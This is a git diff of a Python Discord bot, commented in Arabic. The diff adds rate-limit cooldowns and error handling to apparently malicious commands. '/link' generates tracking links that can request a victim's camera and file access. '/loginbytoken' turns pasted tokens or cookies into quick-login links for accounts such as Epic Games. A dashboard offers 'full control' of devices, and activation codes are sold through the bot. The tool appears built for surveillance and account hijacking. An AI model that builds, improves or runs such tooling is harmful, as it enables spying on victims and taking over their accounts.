@@ -166,7 +166,6 @@ def track_visitor():
     </html>
     """, target=redirect_target)
 
-# تعديل تشغيل السيرفر ليناسب Render تلقائياً
 def run():
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
@@ -281,15 +280,22 @@ def generate_random_code():
 def fetch_db():
     url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
     headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
-    r = requests.get(url, headers=headers, timeout=5)
-    if r.status_code == 200:
-        file_data = r.json()
-        return json.loads(base64.b64decode(file_data["content"]).decode("utf-8")), file_data["sha"], url, headers
+    try:
+        r = requests.get(url, headers=headers, timeout=5)
+        if r.status_code == 200:
+            file_data = r.json()
+            return json.loads(base64.b64decode(file_data["content"]).decode("utf-8")), file_data["sha"], url, headers
+    except Exception:
+        pass
     return None, None, url, headers
 
 def save_db(db, sha, url, headers, commit_message):
-    new_content = base64.b64encode(json.dumps(db, indent=4).encode("utf-8")).decode("utf-8")
-    return requests.put(url, headers=headers, json={"message": commit_message, "content": new_content, "sha": sha}, timeout=5).status_code in [200, 201]
+    try:
+        new_content = base64.b64encode(json.dumps(db, indent=4).encode("utf-8")).decode("utf-8")
+        r = requests.put(url, headers=headers, json={"message": commit_message, "content": new_content, "sha": sha}, timeout=5)
+        return r.status_code in [200, 201]
+    except Exception:
+        return False
 
 class ConfirmSaveView(discord.ui.View):
     def __init__(self, codes, count):
@@ -300,6 +306,7 @@ class ConfirmSaveView(discord.ui.View):
     @discord.ui.button(label="نعم، حفظ الأكواد", style=discord.ButtonStyle.green, custom_id="save_yes")
     async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        await asyncio.sleep(1) # حماية من السبام
         db, sha, url, headers = fetch_db()
         if not db: return
         if "codes" not in db: db["codes"] = {}
@@ -474,12 +481,19 @@ class MainDashboardView(discord.ui.View):
         await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل:**", view=DevicesSubMenuView(devs_list) if devs_list else None, ephemeral=True)
 
 @client.tree.command(name="generate", description="توليد أكواد تفعيل جديدة")
+@app_commands.checks.cooldown(1, 4) # حماية: استخدام الأمر مرة كل 4 ثوانٍ لمنع الحظر
 async def generate(interaction: discord.Interaction, count: int = 1):
     if not 1 <= count <= 20: return await interaction.response.send_message("❌ من 1 إلى 20 فقط.", ephemeral=True)
     codes = [generate_random_code() for _ in range(count)]
     await interaction.response.send_message(f"⚠️ **حفظ الأكواد؟**\n" + "\n".join([f"`{c}`" for c in codes]), view=ConfirmSaveView(codes, count), ephemeral=True)
 
+@generate.error
+async def generate_error(interaction: discord.Interaction, error):
+    if isinstance(error, app_commands.CommandOnCooldown):
+        await interaction.response.send_message(f"⏳ مهلا! يرجى الانتظار `{error.retry_after:.1f}` ثانية قبل استخدام هذا الأمر مرة أخرى لمنع الحظر.", ephemeral=True)
+
 @client.tree.command(name="loginbytoken", description="توليد رابط دخول سريع وعرض التوكن للنسخ المباشر")
+@app_commands.checks.cooldown(1, 3)
 @app_commands.describe(platform="اختر المنصة", token_or_cookie="ضع التوكن أو الكوكيز هنا")
 @app_commands.choices(platform=[
     app_commands.Choice(name="Epic Games", value="epic"),
@@ -512,6 +526,7 @@ async def loginbytoken_command(interaction: discord.Interaction, platform: str, 
     await interaction.followup.send(content=response_text, ephemeral=True)
 
 @client.tree.command(name="link", description="توليد رابط تتبع مع خيارات الكاميرا والوصول للملفات")
+@app_commands.checks.cooldown(1, 3)
 @app_commands.describe(redirect_to="رابط الوجهة النهائية", capture_cam="طلب إذن الكاميرا؟", file_system="تفعيل الوصول للملفات")
 @app_commands.choices(capture_cam=[app_commands.Choice(name="نعم", value="true"), app_commands.Choice(name="لا", value="false")],
                     file_system=[app_commands.Choice(name="تفعيل", value="true"), app_commands.Choice(name="إيقاف", value="false")])
@@ -567,7 +582,7 @@ async def delete_code(interaction: discord.Interaction, code: str):
         await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
         return
     del db["codes"][code]
-    if save_db(db, sha, url, headers, f"Delete code: {code}otipo"):
+    if save_db(db, sha, url, headers, f"Delete code: {code}"):
         await interaction.followup.send(f"🗑️ تم حذف الكود `{code}` نهائياً!", ephemeral=True)
 
 @client.tree.command(name="resetdevice", description="تصفير ارتباط الكود وإرجاعه متاحاً")
